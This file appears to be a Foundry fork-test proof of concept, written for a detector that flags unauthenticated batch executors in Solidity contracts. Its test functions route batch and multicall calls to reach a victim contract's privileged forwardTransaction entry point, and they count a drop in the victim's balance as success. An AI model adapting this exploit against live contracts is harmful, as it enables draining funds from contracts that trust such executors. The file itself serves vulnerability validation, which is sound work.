// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unauthenticated batch executor
/// @notice Detector: unauthenticated-batch-call. A public function takes a
///         list of targets and matching calldata and executes them from the
///         contract's own context, with no access check. Any caller can make
///         the contract call anything, including functions that trust it.
/// @dev FORK-ONLY. Reference incidents: the QNT pool drain (April 2026) --
///      a legacy batch(address[],bytes[]) with no access control routed a call
///      through an EIP-7702-delegated admin EOA, so the pool's
///      _isAdmin(msg.sender) check passed for the attacker; Squid multicall
///      allowance drain (April 2026).
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      POC_PRIVILEGED is the function on POC_VICTIM the batch will call; the
///      verdict is the victim's balance moving, never the batch returning.
contract PoC is Test {
    address public target;      // the batch executor
    address public victim;      // the contract that trusts the executor
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        victim = vm.envOr("POC_VICTIM", address(0));
        require(target != address(0), "POC_TARGET not set (the batch executor)");
        require(victim != address(0), "POC_VICTIM not set (the contract that trusts the executor)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "executor has no code at this fork block");
        assertGt(victim.code.length, 0, "victim has no code at this fork block");
    }

    /// The privileged call the attacker wants the executor to make on its
    /// behalf. Adapt the selector to the victim's admin-only entry point.
    function _payload(address attacker) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("forwardTransaction(address,bytes)", attacker, bytes(""));
    }

    function test_batchReachesPrivilegedCall() public {
        address attacker = makeAddr("attacker");
        uint256 victimBefore = victim.balance;

        address[] memory targets = new address[](1);
        bytes[] memory data = new bytes[](1);
        targets[0] = victim;
        data[0] = _payload(attacker);

        vm.prank(attacker);
        (bool ok,) = target.call(abi.encodeWithSignature("batch(address[],bytes[])", targets, data));
        console.log("batch returned:", ok, "victim balance delta:", victimBefore - victim.balance);

        // Fall back to the other common shape (multicall(bytes[])).
        if (!ok) {
            bytes[] memory calls = new bytes[](1);
            calls[0] = abi.encodeWithSignature("forwardTransaction(address,bytes)", attacker, bytes(""));
            vm.prank(attacker);
            (ok,) = target.call(abi.encodeWithSignature("multicall(bytes[])", calls));
            console.log("multicall returned:", ok, "victim balance delta:", victimBefore - victim.balance);
        }

        assertTrue(
            ok && victim.balance < victimBefore,
            "the batch did not reach a fund-moving privileged call. This does NOT establish safety: the executor may expose another batch shape, the privileged selector may differ, or the victim may not trust this executor at the fork block. Confirm the victim's admin check and set the payload to match."
        );
    }
}
